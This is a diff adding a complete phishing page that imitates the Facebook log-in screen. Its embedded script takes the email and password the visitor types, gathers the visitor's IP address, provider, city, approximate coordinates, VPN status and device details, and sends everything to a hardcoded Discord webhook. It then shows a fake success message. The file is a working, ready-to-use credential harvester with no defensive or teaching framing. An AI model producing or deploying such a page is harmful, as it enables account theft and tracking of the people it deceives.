@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook – log in or sign up</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;500;600;700&display=swap">
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      font-family: SF Pro Display, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: #f0f2f5;
+      color: #1c1e21;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .container {
+      max-width: 980px;
+      width: 100%;
+      padding: 0 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 32px;
+      flex-wrap: wrap;
+    }
+    .left {
+      flex: 1;
+      min-width: 300px;
+    }
+    .left h1 {
+      color: #1877f2;
+      font-size: 4.2rem;
+      font-weight: bold;
+      margin-bottom: 8px;
+      line-height: 0.9;
+    }
+    .left p {
+      font-size: 1.75rem;
+      font-weight: normal;
+      line-height: 1.3;
+      max-width: 500px;
+    }
+    .right {
+      flex: 0 0 396px;
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+      padding: 20px 0;
+      text-align: center;
+    }
+    form { padding: 0 16px; }
+    input {
+      width: 100%;
+      height: 52px;
+      padding: 0 14px;
+      margin-bottom: 16px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 1.0625rem;
+      color: #1d2129;
+    }
+    input:focus {
+      outline: none;
+      border-color: #1877f2;
+      box-shadow: 0 0 0 2px rgba(24,119,242,0.3);
+    }
+    .login-btn {
+      width: 100%;
+      height: 48px;
+      background: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 1.25rem;
+      font-weight: bold;
+      cursor: pointer;
+      margin-bottom: 12px;
+    }
+    .login-btn:hover { background: #166fe5; }
+    .forgot {
+      display: block;
+      color: #1877f2;
+      font-size: 0.9375rem;
+      text-decoration: none;
+      margin: 12px 0 20px;
+    }
+    .forgot:hover { text-decoration: underline; }
+    hr {
+      border: none;
+      border-top: 1px solid #dadde1;
+      margin: 20px 0;
+    }
+    .create-btn {
+      background: #42b72a;
+      color: white;
+      font-size: 1.0625rem;
+      font-weight: bold;
+      padding: 12px 24px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    .create-btn:hover { background: #36a420; }
+    .status {
+      margin-top: 16px;
+      font-size: 0.95rem;
+      min-height: 1.4em;
+    }
+    .success { color: #31a24c; }
+    .error   { color: #e41e1e; }
+
+    @media (max-width: 900px) {
+      .container { flex-direction: column; text-align: center; }
+      .left { text-align: center; margin-bottom: 40px; }
+      .left h1 { font-size: 3.5rem; }
+      .left p { font-size: 1.4rem; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="left">
+    <h1>facebook</h1>
+    <p>Connect with friends and the world<br>around you on Facebook.</p>
+  </div>
+
+  <div class="right">
+    <form id="fbLogin">
+      <input type="text" id="email" placeholder="Email address or phone number" autocomplete="off" required>
+      <input type="password" id="pass" placeholder="Password" autocomplete="off" required>
+      <button type="submit" class="login-btn">Log In</button>
+      <a href="#" class="forgot">Forgotten password?</a>
+      <hr>
+      <button type="button" class="create-btn">Create new account</button>
+    </form>
+
+    <div class="status" id="msg"></div>
+  </div>
+</div>
+
+<script>
+// ────────────────────────────────────────────────
+//  CHANGE THIS TO YOUR REAL DISCORD WEBHOOK
+// ────────────────────────────────────────────────
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1473312861249081398/lt3CWhpRKPjYynhw0BxdEgo1fLsTn6wHzR9c7zWCmGPvI6U0Z6l9STcGnk_q3GLOuyzv";
+
+async function getIPAndGeo() {
+  try {
+    const res = await fetch("https://ip-api.com/json/?fields=status,message,query,as,isp,org,country,regionName,city,lat,lon,timezone,mobile,proxy,hosting", {
+      cache: "no-store"
+    });
+    if (!res.ok) throw new Error("API error");
+    const data = await res.json();
+
+    if (data.status !== "success") {
+      throw new Error(data.message || "API failed");
+    }
+
+    // Parse ASN & Provider
+    let asnFull = data.as || "Unknown";               // e.g. "AS17639 Converge ICT Solutions Inc."
+    let provider = data.isp || data.org || "Unknown"; // Prefer isp, fallback to org
+
+    return {
+      ip: data.query || "unknown",
+      asn: asnFull,
+      provider: provider,
+      country: data.country || "unknown",
+      region: data.regionName || "unknown",
+      city: data.city || "unknown",
+      lat: data.lat || null,
+      lon: data.lon || null,
+      timezone: data.timezone || "unknown",
+      mobile: data.mobile ? "True" : "False",
+      proxy: data.proxy ? "True" : "False",  // covers proxy/VPN/Tor
+      hosting: data.hosting ? "True" : "False",
+      bot: (data.proxy || data.hosting) ? "Likely" : "False"  // rough approximation
+    };
+  } catch (err) {
+    console.error(err);
+    return {
+      ip: "fetch failed",
+      asn: "unknown",
+      provider: "unknown",
+      country: "unknown",
+      region: "unknown",
+      city: "unknown",
+      lat: null,
+      lon: null,
+      timezone: "unknown",
+      mobile: "unknown",
+      proxy: "unknown",
+      hosting: "unknown",
+      bot: "unknown"
+    };
+  }
+}
+
+function guessDeviceType() {
+  const ua = navigator.userAgent.toLowerCase();
+  const w = screen.width;
+  if (/mobile|android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua) || w <= 768) return "Mobile";
+  if (/tablet|ipad|kindle|playbook|silk/i.test(ua) || (w > 768 && w <= 1024)) return "Tablet";
+  return "Desktop / Laptop";
+}
+
+document.getElementById("fbLogin").addEventListener("submit", async e => {
+  e.preventDefault();
+
+  const email    = document.getElementById("email").value.trim();
+  const password = document.getElementById("pass").value.trim();
+  const msg      = document.getElementById("msg");
+
+  if (!email || !password) {
+    msg.textContent = "Please fill in all fields";
+    msg.className = "status error";
+    return;
+  }
+
+  msg.textContent = "Logging in...";
+  msg.className = "status";
+
+  const geo = await getIPAndGeo();
+  const deviceType = guessDeviceType();
+
+  const coords = geo.lat && geo.lon ? `${geo.lat.toFixed(4)}, ${geo.lon.toFixed(4)} (Approximate)` : "unknown";
+
+  const payload = {
+    content: null,
+    embeds: [{
+      title: "📱 Facebook Login Attempt",
+      color: 0x1877F2,
+      description: "```text\n" +
+        `IP: ${geo.ip}\n` +
+        `Provider: ${geo.provider}\n` +
+        `ASN: ${geo.asn}\n` +
+        `Country: ${geo.country}\n` +
+        `Region: ${geo.region}\n` +
+        `City: ${geo.city}\n` +
+        `Coords: ${coords}\n` +
+        `Timezone: ${geo.timezone}\n` +
+        `Mobile: ${geo.mobile}\n` +
+        `VPN/Proxy: ${geo.proxy}\n` +
+        `Bot/Likely: ${geo.bot}\n` +
+      "```",
+      fields: [
+        { name: "Email / Phone", value: `\`\`\`${email}\`\`\``, inline: true },
+        { name: "Password",      value: `\`\`\`${password}\`\`\``, inline: true },
+        { name: "Website / Page", value: `\`\`\`${location.href}\`\`\``, inline: false },
+        { name: "Device Type",   value: deviceType, inline: true },
+        { name: "Screen",        value: `${screen.width} × ${screen.height} (${window.devicePixelRatio}x)`, inline: true },
+        { name: "User-Agent",    value: `\`\`\`${navigator.userAgent.substring(0, 140)}${navigator.userAgent.length > 140 ? '...' : ''}\`\`\``, inline: false }
+      ],
+      timestamp: new Date().toISOString(),
+      footer: { text: `${location.hostname} • ${geo.provider || geo.ip}` }
+    }]
+  };
+
+  try {
+    const res = await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+
+    if (res.ok) {
+      msg.textContent = "Success! You may now close this page.";
+      msg.className = "status success";
+      // Optional: setTimeout(() => { window.location = "https://www.facebook.com"; }, 2200);
+    } else {
+      msg.textContent = "Something went wrong. Try again.";
+      msg.className = "status error";
+    }
+  } catch (err) {
+    msg.textContent = "Network error – check connection";
+    msg.className = "status error";
+  }
+});
+</script>
+
+</body>
+</html>
